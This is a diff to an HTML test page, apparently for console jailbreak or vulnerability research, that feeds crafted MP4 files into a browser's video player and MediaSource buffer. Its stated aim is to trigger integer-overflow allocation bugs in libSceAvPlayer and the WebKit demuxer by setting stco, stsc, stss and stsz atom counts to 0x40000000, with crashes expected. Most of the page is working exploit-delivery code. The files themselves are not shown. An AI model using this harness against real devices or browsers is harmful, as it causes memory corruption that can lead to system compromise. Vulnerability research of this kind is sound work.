@@ -1,35 +1,369 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
 <meta charset="utf-8">
-<title>AvPlayer MP4 count-truncation test</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>DEEPSLOP — AvPlayer & Media Demuxer Security Test</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
 <style>
-  body { background:#111; color:#eee; font-family:monospace; }
-  button { font-size:16px; margin:6px; padding:10px 16px; cursor:pointer; }
-  #log { margin-top:14px; white-space:pre-wrap; font-size:13px; color:#8f8; }
+  :root {
+    --bg-base: #0a0f1a;
+    --card-bg: rgba(18, 24, 38, 0.85);
+    --card-border: rgba(255, 255, 255, 0.1);
+    --cyan-1: #06b6d4;
+    --cyan-2: #38bdf8;
+    --emerald: #10b981;
+    --rose: #f43f5e;
+    --amber: #f59e0b;
+    --text-main: #f1f5f9;
+    --text-muted: #94a3b8;
+  }
+
+  * { box-sizing: border-box; }
+
+  html, body {
+    margin: 0; padding: 0; min-height: 100%;
+    background-color: var(--bg-base);
+    background-image: 
+      radial-gradient(circle at 15% 25%, rgba(6, 182, 212, 0.15), transparent 45%),
+      radial-gradient(circle at 85% 75%, rgba(16, 185, 129, 0.10), transparent 45%),
+      radial-gradient(circle at 50% 50%, rgba(244, 63, 94, 0.06), transparent 50%);
+    background-size: 200% 200%;
+    color: var(--text-main);
+    font: 15px/1.5 "Inter", system-ui, sans-serif;
+  }
+
+  body {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    padding: 24px 16px 50px;
+  }
+
+  #wrap {
+    width: 100%;
+    max-width: 820px;
+    display: flex;
+    flex-direction: column;
+    gap: 18px;
+  }
+
+  /* ── Header ── */
+  header {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    flex-wrap: wrap;
+    padding-bottom: 12px;
+    border-bottom: 1px solid rgba(255,255,255,0.12);
+  }
+
+  #logo {
+    font-weight: 800;
+    font-size: 22px;
+    letter-spacing: 0.5px;
+    background: linear-gradient(90deg, #38bdf8, #818cf8);
+    -webkit-background-clip: text;
+    background-clip: text;
+    color: transparent;
+  }
+
+  #spacer { flex: 1; }
+
+  .chip {
+    font-family: "JetBrains Mono", monospace;
+    font-size: 13px;
+    padding: 5px 14px;
+    border-radius: 999px;
+    border: 1px solid rgba(255,255,255,0.15);
+    color: #94a3b8;
+    background: rgba(0,0,0,0.3);
+  }
+  .chip.on { color: var(--emerald); border-color: rgba(16,185,129,0.4); }
+
+  /* ── Cards ── */
+  .card {
+    background: var(--card-bg);
+    border: 1px solid var(--card-border);
+    border-radius: 18px;
+    padding: 20px 24px;
+    box-shadow: 0 8px 30px rgba(0, 0, 0, 0.35);
+  }
+
+  .sec-title {
+    font-size: 13px;
+    font-weight: 700;
+    letter-spacing: 1.5px;
+    color: var(--cyan-2);
+    text-transform: uppercase;
+    margin: 0 0 12px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+
+  /* ── Buttons ── */
+  .btn {
+    font-family: "Inter", system-ui, sans-serif;
+    font-size: 14px;
+    font-weight: 700;
+    padding: 12px 18px;
+    border-radius: 12px;
+    border: 1px solid rgba(255,255,255,0.12);
+    cursor: pointer;
+    background: rgba(255,255,255,0.05);
+    color: var(--text-main);
+    transition: transform .15s ease, background .2s ease, box-shadow .2s ease;
+    text-decoration: none;
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    gap: 6px;
+  }
+  .btn:hover:not(:disabled) {
+    transform: translateY(-2px);
+    background: rgba(255,255,255,0.12);
+    box-shadow: 0 6px 16px rgba(0,0,0,0.3);
+  }
+  .btn:disabled { opacity: .4; cursor: not-allowed; }
+
+  .btn.primary {
+    background: linear-gradient(135deg, #0284c7, #0369a1);
+    color: #fff;
+    border: none;
+    box-shadow: 0 4px 15px rgba(2, 132, 199, 0.3);
+  }
+  .btn.primary:hover:not(:disabled) {
+    background: linear-gradient(135deg, #0ea5e9, #0284c7);
+  }
+
+  .btn.danger {
+    background: linear-gradient(135deg, #e11d48, #be123c);
+    color: #fff;
+    border: none;
+  }
+
+  .btn.ghost {
+    background: transparent;
+    border-color: rgba(255,255,255,0.1);
+    color: var(--text-muted);
+  }
+  .btn.ghost:hover { color: var(--text-main); }
+
+  .btn-grid {
+    display: grid;
+    grid-template-columns: repeat(2, 1fr);
+    gap: 10px;
+    margin-top: 10px;
+  }
+  @media (max-width: 600px) { .btn-grid { grid-template-columns: 1fr; } }
+
+  .test-item {
+    background: rgba(0,0,0,0.25);
+    border: 1px solid rgba(255,255,255,0.08);
+    border-radius: 12px;
+    padding: 14px 16px;
+    display: flex;
+    flex-direction: column;
+    gap: 6px;
+  }
+  .test-title { font-weight: 700; font-size: 14px; color: #fff; }
+  .test-desc { font-size: 12px; color: var(--text-muted); }
+
+  .row { display: flex; gap: 10px; flex-wrap: wrap; }
+  .row .btn { flex: 1; min-width: 130px; }
+
+  /* ── Video Player ── */
+  video {
+    width: 100%;
+    max-height: 240px;
+    border-radius: 12px;
+    background: #000;
+    margin-top: 10px;
+    border: 1px solid rgba(255,255,255,0.1);
+  }
+
+  /* ── Log Monitor ── */
+  #log {
+    background: #050a14;
+    border: 1px solid rgba(255,255,255,0.15);
+    border-radius: 12px;
+    padding: 14px 16px;
+    font-family: "JetBrains Mono", monospace;
+    font-size: 12px;
+    line-height: 1.6;
+    max-height: 280px;
+    overflow-y: auto;
+    white-space: pre-wrap;
+    word-break: break-all;
+  }
+  .l-ok { color: var(--emerald); }
+  .l-err { color: var(--rose); }
+  .l-warn { color: var(--amber); }
+  .l-info { color: var(--cyan-2); }
 </style>
 </head>
 <body>
-<h3>libSceAvPlayer stbl count-truncation test (4 variants)</h3>
-<p>Each button loads the video element with the poisoned mp4. Expected:
-crash / browser restart / blank page. If none of them kills the process,
-the bug is not reached (rejected earlier) — try base.mp4 first to sanity-check playback.</p>
-<button onclick="play('media/evil_stts.mp4')">stts count=0x10000000 (alloc 16n+1 wrap)</button>
-<button onclick="play('media/evil_stco.mp4')">stco count=0x40000000 (alloc 4n = 0)</button>
-<button onclick="play('media/evil_stss.mp4')">stss count=0x40000000 (alloc 4n+1 wrap)</button>
-<button onclick="play('media/evil_stsz.mp4')">stsz count=0x40000000 (alloc 4n+1 wrap)</button>
-<button onclick="play('eviltest/base.mp4')">sanity: base.mp4 (should play)</button>
-<video id="v" width="480" height="270" controls></video>
-<div id="log">ready</div>
+<div id="wrap">
+  <header>
+    <span id="logo">🎬 AvPlayer & Media Demuxer Test</span>
+    <span id="spacer"></span>
+    <span class="chip on">32-bit Gate Edition</span>
+    <a class="btn ghost" href="index.html" style="padding:5px 14px; font-size:12px;">← DASHBOARD</a>
+  </header>
+
+  <div class="card">
+    <div class="sec-title">🎯 32-bit Gate Bypass MP4 Test Battery</div>
+    <p style="margin:0 0 12px; color:var(--text-muted); font-size:13.5px;">
+      Tests <code>stco</code>, <code>stsc</code>, <code>stss</code>, and <code>stsz</code> atom parsers with count <code>0x40000000</code> to bypass the 32-bit allocation size checks in <code>libSceAvPlayer</code> / WebKit demuxer.
+    </p>
+
+    <div class="btn-grid">
+      <div class="test-item">
+        <span class="test-title">STCO 32-bit Gate</span>
+        <span class="test-desc">Chunk Offset Table · count=0x40000000 (alloc 4n = 0 wrap)</span>
+        <div class="row" style="margin-top:6px;">
+          <button class="btn primary" onclick="testUrl('media/evil_stco_32bit_gate.mp4', 'stco')">▶ URL Load</button>
+          <button class="btn ghost" onclick="testMse('media/evil_stco_32bit_gate.mp4', 'stco')">⚡ MSE Append</button>
+        </div>
+      </div>
+
+      <div class="test-item">
+        <span class="test-title">STSC 32-bit Gate</span>
+        <span class="test-desc">Sample-to-Chunk Table · count=0x40000000 (alloc 12n wrap)</span>
+        <div class="row" style="margin-top:6px;">
+          <button class="btn primary" onclick="testUrl('media/evil_stsc_32bit_gate.mp4', 'stsc')">▶ URL Load</button>
+          <button class="btn ghost" onclick="testMse('media/evil_stsc_32bit_gate.mp4', 'stsc')">⚡ MSE Append</button>
+        </div>
+      </div>
+
+      <div class="test-item">
+        <span class="test-title">STSS 32-bit Gate</span>
+        <span class="test-desc">Sync Sample (Keyframe) · count=0x40000000 (alloc 4n+1 wrap)</span>
+        <div class="row" style="margin-top:6px;">
+          <button class="btn primary" onclick="testUrl('media/evil_stss_32bit_gate.mp4', 'stss')">▶ URL Load</button>
+          <button class="btn ghost" onclick="testMse('media/evil_stss_32bit_gate.mp4', 'stss')">⚡ MSE Append</button>
+        </div>
+      </div>
+
+      <div class="test-item">
+        <span class="test-title">STSZ 32-bit Gate</span>
+        <span class="test-desc">Sample Size Table · count=0x40000000 (alloc 4n+1 wrap)</span>
+        <div class="row" style="margin-top:6px;">
+          <button class="btn primary" onclick="testUrl('media/evil_stsz_32bit_gate.mp4', 'stsz')">▶ URL Load</button>
+          <button class="btn ghost" onclick="testMse('media/evil_stsz_32bit_gate.mp4', 'stsz')">⚡ MSE Append</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="row" style="margin-top:16px;">
+      <button class="btn danger" onclick="runAllTests()">⚡ RUN ALL TESTS (BATCH)</button>
+      <button class="btn ghost" onclick="clearLog()">CLEAR LOG</button>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="sec-title">📺 Native Playback Output</div>
+    <video id="player" controls playsinline></video>
+  </div>
+
+  <div class="card">
+    <div class="sec-title">📋 Execution Log</div>
+    <div id="log">Ready — select a test variant above.</div>
+  </div>
+</div>
+
 <script>
-function play(src) {
-  var v = document.getElementById('v');
-  var log = document.getElementById('log');
-  log.textContent = 'loading ' + src + ' ...';
-  v.onplaying = function(){ log.textContent = 'PLAYING ' + src + ' (bug not triggered)'; };
-  v.onerror  = function(){ log.textContent = 'error event: ' + v.error.code + ' on ' + src; };
-  v.src = src;
-  v.play();
+"use strict";
+
+const player = document.getElementById("player");
+const logEl = document.getElementById("log");
+
+function log(msg, type = "info") {
+  const ts = new Date().toLocaleTimeString();
+  const cls = type === "ok" ? "l-ok" : type === "err" ? "l-err" : type === "warn" ? "l-warn" : "l-info";
+  const div = document.createElement("div");
+  div.className = cls;
+  div.textContent = `[${ts}] ${msg}`;
+  if (logEl.textContent === "Ready — select a test variant above.") logEl.innerHTML = "";
+  logEl.appendChild(div);
+  logEl.scrollTop = logEl.scrollHeight;
+}
+
+function clearLog() {
+  logEl.innerHTML = '<div class="l-info">Ready — log cleared.</div>';
+}
+
+function testUrl(src, label) {
+  log(`Testing ${label} via Direct <video src> (${src})...`, "info");
+  player.pause();
+  player.removeAttribute("src");
+  player.load();
+
+  player.onplaying = () => log(`[PLAYING] ${label} - Stream playing (demuxer parsed atom safely)`, "warn");
+  player.onerror = () => {
+    const err = player.error;
+    log(`[ERROR] ${label} - Video error (Code ${err ? err.code : 'unknown'}, Message: ${err ? err.message : 'rejected early'})`, "warn");
+  };
+
+  player.src = src + "?_=" + Date.now();
+  player.play().catch(e => log(`[INFO] Play promise rejected: ${e.message}`, "info"));
+}
+
+function testMse(src, label) {
+  log(`Testing ${label} via MSE (MediaSource appendBuffer)...`, "info");
+  if (!window.MediaSource) {
+    log("[ERR] MediaSource Extensions (MSE) not supported on this browser", "err");
+    return;
+  }
+
+  const ms = new MediaSource();
+  player.src = URL.createObjectURL(ms);
+
+  ms.addEventListener("sourceopen", () => {
+    log(`MediaSource opened for ${label} — fetching arrayBuffer...`, "info");
+    fetch(src + "?_=" + Date.now())
+      .then(r => {
+        if (!r.ok) throw new Error("HTTP " + r.status);
+        return r.arrayBuffer();
+      })
+      .then(buf => {
+        log(`Fetched ${buf.byteLength} bytes for ${label} — creating sourceBuffer...`, "info");
+        try {
+          const sb = ms.addSourceBuffer('video/mp4; codecs="avc1.42E01E, mp4a.40.2"');
+          sb.addEventListener("updateend", () => {
+            log(`[OK] MSE appendBuffer completed for ${label}`, "ok");
+          });
+          sb.addEventListener("error", (e) => {
+            log(`[WARN] MSE appendBuffer error event for ${label}`, "warn");
+          });
+          sb.appendBuffer(buf);
+        } catch (e) {
+          log(`[ERR] addSourceBuffer / appendBuffer exception: ${e.message}`, "err");
+        }
+      })
+      .catch(e => log(`[ERR] Fetch failed: ${e.message}`, "err"));
+  });
+}
+
+async function runAllTests() {
+  const tests = [
+    { src: 'media/evil_stco_32bit_gate.mp4', label: 'stco' },
+    { src: 'media/evil_stsc_32bit_gate.mp4', label: 'stsc' },
+    { src: 'media/evil_stss_32bit_gate.mp4', label: 'stss' },
+    { src: 'media/evil_stsz_32bit_gate.mp4', label: 'stsz' }
+  ];
+
+  log("Starting Batch Test Sequence...", "info");
+  for (const t of tests) {
+    testUrl(t.src, t.label);
+    await new Promise(r => setTimeout(r, 1800));
+    testMse(t.src, t.label);
+    await new Promise(r => setTimeout(r, 1800));
+  }
+  log("Batch sequence completed.", "ok");
 }
 </script>
 </body>
